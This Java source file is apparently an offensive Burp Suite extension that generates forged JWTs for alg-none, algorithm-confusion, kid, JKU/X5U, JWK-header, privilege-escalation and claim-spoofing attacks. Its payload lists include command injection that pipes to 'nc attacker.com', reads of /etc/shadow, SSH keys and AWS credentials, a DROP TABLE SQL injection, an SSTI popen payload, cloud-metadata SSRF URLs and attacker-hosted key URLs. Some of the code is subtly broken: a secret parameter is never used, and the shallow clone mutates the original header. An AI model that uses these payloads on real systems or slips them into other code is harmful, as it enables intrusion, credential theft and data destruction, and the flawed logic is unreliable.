package burp.jwt;

import java.util.*;

/**
 * Advanced JWT Attack Platform
 * Implements 7 specialized attack modules covering all JWTAuditor features
 */
public class AdvancedAttackPlatform {
    
    private JWTToken token;
    
    public AdvancedAttackPlatform(JWTToken token) {
        this.token = token;
    }
    
    /**
     * Attack 1: None Algorithm Bypass
     * Removes signature verification completely
     */
    public JWTToken generateNoneAlgorithmBypass() {
        JWTToken attacked = cloneToken();
        attacked.getHeader().setAlg("none");
        attacked.setSignature("");
        return attacked;
    }
    
    /**
     * Attack 2: Algorithm Confusion (RS256 → HS256)
     * Generates 14+ variations of algorithm confusion attacks
     */
    public List<JWTToken> generateAlgorithmConfusionAttacks(String newSecret) {
        List<JWTToken> attacks = new ArrayList<>();
        
        // Algorithm confusion variations
        String[] confusionVariations = {
            "HS256", "HS384", "HS512",
            "hs256", "hs384", "hs512",
            "HMAC256", "HMAC384", "HMAC512",
            "hmac256", "hmac384", "hmac512",
            "HmacSHA256", "HmacSHA384", "HmacSHA512"
        };
        
        for (String newAlg : confusionVariations) {
            JWTToken attacked = cloneToken();
            attacked.getHeader().setAlg(newAlg);
            attacks.add(attacked);
        }
        
        return attacks;
    }
    
    /**
     * Attack 3: KID Parameter Injection
     * 47+ payloads for path traversal and command injection
     */
    public List<JWTToken> generateKIDInjectionPayloads() {
        List<JWTToken> attacks = new ArrayList<>();
        
        String[] kidPayloads = {
            // Path traversal - Unix
            "../public/key", "../../public/key", "../../../public/key",
            "../../../../public/key", "../../../../../public/key",
            "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/config",
            "~/.ssh/id_rsa", "~/.aws/credentials", "~/.docker/config.json",
            
            // Path traversal - Windows
            "..\\public\\key", "..\\..\\public\\key", "..\\..\\..\\public\\key",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            
            // File protocol
            "file:///etc/passwd", "file:///etc/shadow",
            "file:///c:/windows/win.ini", "file:///c:/boot.ini",
            
            // Command injection
            "key1; cat /etc/passwd", "key1 && whoami",
            "key1 | id", "key1 ` whoami `",
            "key1 $(whoami)", "key1 `id`",
            "key1 | nc attacker.com 1234",
            
            // SQL injection
            "1' OR '1'='1", "1'; DROP TABLE keys; --",
            "1' UNION SELECT * FROM keys --",
            "admin' --", "' OR 1=1 --",
            
            // Template injection
            "{{7*7}}", "${7*7}", "#{7*7}",
            "{{request.application.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            
            // LDAP injection
            "*)(uid=*))(|(uid=*", "admin*", "*admin*",
            "admin*)(|(uid=*", "*)(|(uid=admin",
            
            // SSRF
            "http://localhost:8080/keys", "http://127.0.0.1:8080/admin",
            "http://169.254.169.254/metadata", "http://metadata.google.internal",
            "gopher://localhost:8080", "dict://localhost:6379",
            "sftp://localhost/etc/passwd", "tftp://localhost/keys",
            
            // Null byte injection
            "key1%00", "key1\\0", "key%00admin",
            
            // Unicode encoding
            "%2e%2e%2fkey", "%2e%2e%5ckeyname",
            "..%252fkey", "..%c0%afkey",
            
            // Other bypass techniques
            "key1;key2", "key1,key2", "key1|key2",
            "../key", "~key", "@key", "#key", "$key",
            "key%20name", "key\nname"
        };
        
        for (String payload : kidPayloads) {
            JWTToken attacked = cloneToken();
            attacked.getHeader().setKid(payload);
            attacks.add(attacked);
        }
        
        return attacks;
    }
    
    /**
     * Attack 4: JKU Manipulation
     * Remote key injection attacks
     */
    public JWTToken generateJKUManipulation(String maliciousJkuUrl) {
        JWTToken attacked = cloneToken();
        attacked.getHeader().setJku(maliciousJkuUrl);
        return attacked;
    }
    
    /**
     * Attack 4b: X5U Manipulation
     */
    public JWTToken generateX5UManipulation(String maliciousX5uUrl) {
        JWTToken attacked = cloneToken();
        attacked.getHeader().setX5u(maliciousX5uUrl);
        return attacked;
    }
    
    /**
     * Generate common malicious JKU/X5U URLs
     */
    public List<String> generateMaliciousJKUURLs() {
        List<String> urls = new ArrayList<>();
        
        // External attacker URLs
        urls.add("https://attacker.com/jwks.json");
        urls.add("https://attacker.com/malicious/jwks");
        urls.add("http://attacker.com/.well-known/jwks.json");
        urls.add("https://evil.com/keys.json");
        
        // SSRF/Internal network attacks
        urls.add("http://localhost:8080/.well-known/jwks.json");
        urls.add("http://127.0.0.1:8080/admin/keys");
        urls.add("http://169.254.169.254/metadata");
        urls.add("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity");
        urls.add("http://169.254.169.254/latest/meta-data/");
        urls.add("http://internal-api/keys");
        urls.add("http://192.168.1.1/admin");
        urls.add("http://10.0.0.1/admin");
        
        // Path traversal
        urls.add("file:///etc/passwd");
        urls.add("file:///etc/hosts");
        urls.add("file:///c:/windows/system32/config/sam");
        urls.add("../../../etc/passwd");
        urls.add("....//....//....//etc/passwd");
        
        // Protocol abuse
        urls.add("gopher://localhost:8080/keys");
        urls.add("dict://localhost:6379/get keys");
        urls.add("tftp://localhost/keys.json");
        
        return urls;
    }
    
    /**
     * Attack 5: JWK Header Injection
     * Embed malicious public keys directly in token headers
     */
    public JWTToken generateJWKHeaderInjection(String maliciousJWK) {
        JWTToken attacked = cloneToken();
        attacked.getHeader().addCustomField("jwk", maliciousJWK);
        return attacked;
    }
    
    /**
     * Generate sample malicious JWK
     */
    public String generateMaliciousJWK() {
        return "{\"kty\":\"RSA\",\"use\":\"sig\",\"kid\":\"test\",\"n\":\"...\",\"e\":\"AQAB\"}";
    }
    
    /**
     * Attack 6: Privilege Escalation
     * Systematic claim manipulation for privilege escalation
     */
    public JWTToken generatePrivilegeEscalation() {
        JWTToken attacked = cloneToken();
        Map<String, Object> payload = attacked.getPayload();
        
        // Admin role variations
        payload.put("role", "admin");
        payload.put("roles", Arrays.asList("admin", "root", "administrator"));
        payload.put("is_admin", true);
        payload.put("admin", true);
        payload.put("is_root", true);
        
        // Permissions
        payload.put("permissions", Arrays.asList("read", "write", "delete", "admin", "root"));
        payload.put("scope", "admin:*");
        payload.put("access_level", 999);
        
        // Groups
        payload.put("groups", Arrays.asList("administrators", "root", "wheel", "sudoers"));
        
        // Remove restrictions
        payload.remove("restrictions");
        payload.remove("limitations");
        payload.remove("max_access_level");
        
        return attacked;
    }
    
    /**
     * Attack 7: Claim Spoofing
     * Advanced payload generation for identity manipulation
     */
    public JWTToken generateClaimSpoofing(Map<String, Object> spoofedClaims) {
        JWTToken attacked = cloneToken();
        attacked.getPayload().putAll(spoofedClaims);
        return attacked;
    }
    
    /**
     * Generate common spoofing scenarios
     */
    public List<JWTToken> generateCommonSpoofingScenarios() {
        List<JWTToken> scenarios = new ArrayList<>();
        
        // Scenario 1: Admin impersonation
        JWTToken adminSpoof = cloneToken();
        adminSpoof.setClaim("sub", "admin");
        adminSpoof.setClaim("name", "Administrator");
        adminSpoof.setClaim("email", "admin@example.com");
        adminSpoof.setClaim("role", "admin");
        adminSpoof.setClaim("is_admin", true);
        scenarios.add(adminSpoof);
        
        // Scenario 2: Different user impersonation
        JWTToken userSpoof = cloneToken();
        userSpoof.setClaim("sub", "victim_user");
        userSpoof.setClaim("name", "Victim User");
        userSpoof.setClaim("email", "victim@example.com");
        scenarios.add(userSpoof);
        
        // Scenario 3: Extended permissions
        JWTToken extendedPerms = cloneToken();
        List<String> perms = Arrays.asList("read:all", "write:all", "delete:all", "admin:all");
        extendedPerms.setClaim("permissions", perms);
        extendedPerms.setClaim("max_access_level", 9999);
        extendedPerms.setClaim("scope", "*");
        scenarios.add(extendedPerms);
        
        // Scenario 4: Time manipulation
        JWTToken timeSpoof = cloneToken();
        timeSpoof.setClaim("exp", 9999999999L);
        timeSpoof.setClaim("iat", 0L);
        timeSpoof.setClaim("nbf", 0L);
        scenarios.add(timeSpoof);
        
        // Scenario 5: Service account impersonation
        JWTToken serviceAccount = cloneToken();
        serviceAccount.setClaim("sub", "service-account");
        serviceAccount.setClaim("name", "Service Account");
        serviceAccount.setClaim("service", "internal-api");
        serviceAccount.setClaim("admin", true);
        scenarios.add(serviceAccount);
        
        return scenarios;
    }
    
    /**
     * Helper: Clone token
     */
    private JWTToken cloneToken() {
        return new JWTToken(
            token.getHeader(),
            new LinkedHashMap<>(token.getPayload()),
            token.getSignature(),
            token.getOriginalToken()
        );
    }
}
